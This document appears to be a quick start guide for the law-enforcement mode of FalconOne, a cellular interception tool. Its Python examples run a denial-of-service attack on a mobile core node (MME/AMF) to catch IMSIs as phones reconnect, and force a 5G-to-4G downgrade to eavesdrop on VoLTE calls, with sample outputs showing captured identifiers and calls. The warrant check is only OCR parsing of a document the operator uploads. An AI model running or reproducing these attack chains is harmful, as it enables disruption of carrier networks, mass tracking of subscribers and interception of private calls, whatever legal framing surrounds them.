# FalconOne LE Mode Quick Start Guide
## Exploit-Enhanced Interception with Warrant Compliance

**Version**: 1.8.1  
**Date**: January 2, 2026  
**Status**: Core Features Implemented

---

## Overview

LE Mode enables **exploit-enhanced interception** for law enforcement operations with:
- ✅ Warrant validation (OCR-based)
- ✅ Cryptographic evidence chains (SHA-256, blockchain-style)
- ✅ Exploit-listen chains (DoS+IMSI, Downgrade+VoLTE)
- ✅ PII redaction (IMSI/IMEI hashing)
- ✅ Forensic exports with chain of custody

---

## Quick Setup (5 Minutes)

### 1. Install Dependencies

```bash
# Install OCR engine (required for warrant validation)
sudo apt install tesseract-ocr  # Linux
brew install tesseract  # macOS

# Install Python packages
pip install pytesseract Pillow web3
```

### 2. Enable LE Mode

Edit `config/config.yaml`:

```yaml
law_enforcement:
  enabled: true  # Enable LE mode
  warrant_validation:
    ocr_enabled: true
    ocr_retries: 3
    required_fields: [jurisdiction, case_number, authorized_by, valid_until, target_identifiers]
  exploit_chain_safeguards:
    mandate_warrant_for_chains: true  # Require warrant
    hash_all_intercepts: true  # SHA-256 all intercepts
    immutable_evidence_log: true  # Blockchain-style chain
    auto_redact_pii: true  # Hash IMSI/IMEI
  evidence_export:
    format: forensic  # Include chain of custody
    retention_days: 90  # Auto-delete after 90 days
  fallback_mode:
    if_warrant_invalid: passive_scan  # Fallback if no warrant
```

### 3. Create Warrant Storage

```bash
mkdir -p logs/warrants
mkdir -p logs/evidence
chmod 700 logs/warrants  # Secure directory
```

---

## Usage Examples

### Example 1: DoS + IMSI Catch Chain

**Scenario**: Crash MME/AMF to create listening window, capture IMSI on reconnect

```python
from falconone.le.intercept_enhancer import InterceptEnhancer
from falconone.core.orchestrator import FalconOneOrchestrator
from datetime import datetime, timedelta

# Initialize
orchestrator = FalconOneOrchestrator('config/config.yaml')
enhancer = InterceptEnhancer(
    orchestrator.config,
    orchestrator.logger,
    orchestrator=orchestrator
)

# Enable LE mode with warrant
enhancer.enable_le_mode(
    warrant_id='WRT-2026-00123',
    warrant_metadata={
        'jurisdiction': 'Southern District NY',
        'case_number': '2026-CR-00123',
        'authorized_by': 'Judge John Smith',
        'valid_until': (datetime.now() + timedelta(days=180)).isoformat(),
        'target_identifiers': ['001010123456789'],
        'operator': 'Officer Jane Doe'
    }
)

# Execute DoS + IMSI chain
result = enhancer.chain_dos_with_imsi_catch(
    target_ip='192.168.1.100',  # Target MME/AMF IP
    dos_duration=30,  # 30s DoS attack
    listen_duration=300,  # 5min listening window
    target_imsi='001010123456789'  # Optional: specific target
)

# Check results
print(f"Success: {result['success']}")
print(f"Captured IMSIs: {len(result['captured_imsis'])}")
print(f"Evidence Blocks: {len(result['evidence_ids'])}")

# Export forensic evidence
for evidence_id in result['evidence_ids']:
    manifest = orchestrator.evidence_chain.export_forensic(
        evidence_id,
        output_path='evidence_export'
    )
    print(f"Exported: {manifest['export_path']}")
```

**Output**:
```
Success: True
Captured IMSIs: 3
Evidence Blocks: 3
Exported: evidence_export/a7f3c8e2/
Exported: evidence_export/b2d4f1a9/
Exported: evidence_export/c8e7a3b5/
```

---

### Example 2: Downgrade + VoLTE Intercept

**Scenario**: Force 5G→4G downgrade for easier VoLTE eavesdropping

```python
# Enable LE mode (same as above)
enhancer.enable_le_mode('WRT-2026-00123', {...})

# Execute downgrade + VoLTE chain
result = enhancer.enhanced_volte_intercept(
    target_imsi='001010123456789',
    downgrade_to='4G',  # Force to 4G (weaker crypto)
    intercept_duration=600  # 10min intercept
)

# Check results
print(f"Success: {result['success']}")
print(f"Intercepted Streams: {len(result['intercepted_streams'])}")

# Streams are automatically hashed with evidence chain
for stream in result['intercepted_streams']:
    print(f"Call ID: {stream['call_id']}, Duration: {stream['duration']}s")
```

**Output**:
```
Success: True
Intercepted Streams: 2
Call ID: 001, Duration: 120s
Call ID: 002, Duration: 85s
```

---

### Example 3: Verify Evidence Chain Integrity

**Scenario**: Verify no tampering occurred

```python
from falconone.utils.evidence_chain import EvidenceChain

# Initialize evidence chain
evidence_chain = EvidenceChain(orchestrator.config, orchestrator.logger)

# Verify integrity
is_valid = evidence_chain.verify_chain()
print(f"Chain Valid: {is_valid}")

# Get summary
summary = evidence_chain.get_chain_summary()
print(f"Total Evidence Blocks: {summary['total_evidence']}")
print(f"Warrants: {summary['warrants']}")
print(f"Evidence Types: {summary['types']}")
```

**Output**:
```
Chain Valid: True
Total Evidence Blocks: 47
Warrants: ['WRT-2026-00123', 'WRT-2026-00124']
Evidence Types: ['imsi_catch', 'volte_voice', 'sms', 'location']
```

---

### Example 4: Export Forensic Evidence

**Scenario**: Export evidence with chain of custody for court

```python
# Export specific evidence block
manifest = evidence_chain.export_forensic(
    block_id='a7f3c8e2...',
    output_path='court_evidence_case_2026_00123'
)

print(f"Evidence Package: {manifest['export_path']}")
print(f"Chain of Custody: {manifest['chain_of_custody']}")
print(f"Integrity Verified: {manifest['integrity_verified']}")
print(f"Warrant ID: {manifest['warrant_id']}")
```

**Exported Files**:
```
court_evidence_case_2026_00123/a7f3c8e2/
├── chain_of_custody.json  # Metadata + timestamps
├── evidence_data.bin      # Raw intercept data
└── integrity_report.txt   # Verification status
```

**chain_of_custody.json** contains:
```json
{
  "evidence_block": {
    "block_id": "a7f3c8e2b1d4f3e8...",
    "timestamp": 1735840800.123,
    "intercept_type": "volte_voice",
    "target_identifier": "3f2e1d0c9b8a7f6e",
    "warrant_id": "WRT-2026-00123",
    "operator": "Officer Jane Doe",
    "data_hash": "sha256:9f8e7d6c..."
  },
  "chain_position": 15,
  "total_chain_length": 47,
  "chain_verified": true,
  "export_timestamp": "2026-01-02T14:30:00Z",
  "forensic_notes": "FalconOne LE Mode Evidence Export"
}
```

---

## CLI Commands

### Check LE Mode Status

```python
python -c "
from falconone.le.intercept_enhancer import InterceptEnhancer
from falconone.utils.config import Config

config = Config('config/config.yaml')
enhancer = InterceptEnhancer(config.data, None)

stats = enhancer.get_statistics()
print(f'LE Mode: {stats[\"le_mode_enabled\"]}')
print(f'Active Warrant: {stats[\"active_warrant\"]}')
print(f'Chains Executed: {stats[\"chains_executed\"]}')
print(f'Success Rate: {stats[\"success_rate\"]}%')
"
```

### Verify Evidence Chain

```bash
python -c "
from falconone.utils.evidence_chain import EvidenceChain
from falconone.utils.config import Config
import logging

config = Config('config/config.yaml')
chain = EvidenceChain(config.data, logging.getLogger())

if chain.verify_chain():
    print('✅ Evidence chain integrity: VERIFIED')
    summary = chain.get_chain_summary()
    print(f'Total blocks: {summary[\"total_evidence\"]}')
else:
    print('❌ Evidence chain integrity: TAMPERED')
"
```

---

## Security Best Practices

### 1. Warrant Management

- ✅ **Always validate warrants before execution**
- ✅ Store warrant documents in encrypted filesystem (`logs/warrants/`)
- ✅ Check warrant expiry dates regularly
- ✅ Use OCR for automated parsing (reduces manual entry errors)

### 2. Evidence Integrity

- ✅ **Verify chain integrity daily**: `evidence_chain.verify_chain()`
- ✅ Never modify evidence files directly (append-only)
- ✅ Backup evidence to secure off-site storage (S3, encrypted)
- ✅ Generate integrity reports for each case

### 3. PII Redaction

- ✅ **Auto-redact PII enabled by default** (IMSI/IMEI → SHA-256)
- ✅ Store plaintext identifiers separately (encrypted database)
- ✅ Only include hashes in evidence exports
- ✅ Maintain mapping table (hash → identifier) for authorized access

### 4. Audit Logging

- ✅ All LE mode operations logged to `logs/audit/`
- ✅ Logs include: warrant ID, operator, timestamps, actions
- ✅ Immutable append-only logs (detect tampering)
- ✅ Review audit logs monthly for compliance

---

## Troubleshooting

### Problem: "Warrant required for exploit-listen chain"

**Solution**: Enable LE mode with valid warrant
```python
enhancer.enable_le_mode('WRT-2026-00123', {...})
```

### Problem: "Evidence chain integrity: TAMPERED"

**Solution**: Evidence has been modified. Investigate immediately.
1. Check `logs/evidence/evidence_chain.json` for anomalies
2. Compare backup copy (if available)
3. Review audit logs for unauthorized access
4. Re-export unaffected evidence blocks

### Problem: "OCR failed to parse warrant"

**Solution**: Ensure Tesseract is installed and warrant is high quality
```bash
# Test OCR
tesseract warrant.jpg stdout

# If fails, preprocess image:
convert warrant.jpg -threshold 50% -resize 200% warrant_clean.jpg
```

### Problem: "Chains executed: 0, success_rate: 0%"

**Solution**: Check if orchestrator is properly initialized
```python
# Verify orchestrator integration
if enhancer.orchestrator is None:
    print("⚠️ Orchestrator not linked - chains will be simulated")
```

---

## Limitations & Future Work

### Current Limitations (v1.8.1)

- 🔄 **API endpoints not implemented** (only Python API available)
- 🔄 **UI integration pending** (no dashboard tab yet)
- 🔄 **3 chains not implemented** (Auth Bypass+SMS, Uplink Injection, Battery Drain)
- 🔄 **Blockchain integration disabled** (web3 added, code pending)

### Roadmap (v1.9.0)

- [ ] REST API endpoints (`/api/le/enhance_exploit`, `/api/le/warrant/validate`)
- [ ] Dashboard "Intercept Chain" tab with drag-and-drop chain builder
- [ ] Remaining exploit-listen chains (3/5 complete → 5/5)
- [ ] Blockchain evidence chain (Ethereum/IPFS)
- [ ] Multi-warrant operations (parallel warrants)
- [ ] Real-time evidence streaming (WebSocket)

---

## Legal Compliance

### CRITICAL: Authorization Required

**LE Mode usage requires**:
- ✅ Valid court order / search warrant
- ✅ Written authorization from network operator (if applicable)
- ✅ Compliance with jurisdiction regulations (RICA, GDPR, CCPA)
- ✅ Proper chain of custody documentation

**Penalties for unauthorized use**:
- Criminal prosecution (wiretapping, unauthorized access)
- Civil liability (privacy violations)
- Evidence inadmissible in court

### Jurisdiction-Specific Notes

**USA**: 
- Requires federal court order under 18 U.S.C. § 2518
- Title III wiretap requirements apply
- Evidence must meet Federal Rules of Evidence 901

**EU**:
- GDPR Article 6(1)(e) - public interest / official authority
- National wiretapping laws apply (vary by country)
- Data retention directives (max 6 months typical)

**South Africa**:
- RICA (Regulation of Interception of Communications Act)
- POPIA (Protection of Personal Information Act)
- Court order from High Court required

---

## Support

For technical support or legal compliance questions:
- **Technical**: review [LE_MODE_IMPLEMENTATION_SUMMARY.md](LE_MODE_IMPLEMENTATION_SUMMARY.md)
- **Legal**: Consult qualified legal counsel in your jurisdiction
- **Testing**: Run `pytest falconone/tests/test_le_mode.py -v`

---

**REMINDER**: LE Mode is for **authorized law enforcement operations only**. Unauthorized use may violate federal wiretapping laws and result in criminal prosecution.
